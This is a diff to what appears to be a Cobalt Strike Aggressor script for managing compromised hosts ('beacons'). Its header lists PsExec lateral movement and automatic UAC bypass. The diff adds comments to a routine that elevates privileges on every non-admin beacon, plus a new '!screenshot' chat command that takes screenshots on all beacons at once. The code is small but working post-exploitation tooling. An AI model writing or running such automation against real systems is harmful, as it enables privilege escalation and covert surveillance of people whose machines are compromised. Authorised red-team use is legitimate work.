@@ -6,6 +6,7 @@
 # - List listeners
 # - PsExec from the event log
 # - Automatically bypass UAC
+# - Screenshot all beacons
 
 # PsExec against $target from $bid
 # TODO figure out how to use with make_token
@@ -19,7 +20,9 @@ sub psexecTarget {
 sub elevateAll {
     $listener = $1;
 
+    # Iterate over all beacons with beacons()
     foreach $b (beacons()) {
+        # Get the id field from $b
         $bid = $b['id'];
 
         if (!-isadmin $bid) {
@@ -78,6 +81,12 @@ on event_public {
             $listener = @args[0];
 
             elevateAll($listener);
+        }
+        # Screenshot all beacons
+        else if ($cmd eq "!screenshot") {
+            foreach $b (beacons()){
+                bscreenshot($b['id']);
+            }
         }
     }
 }
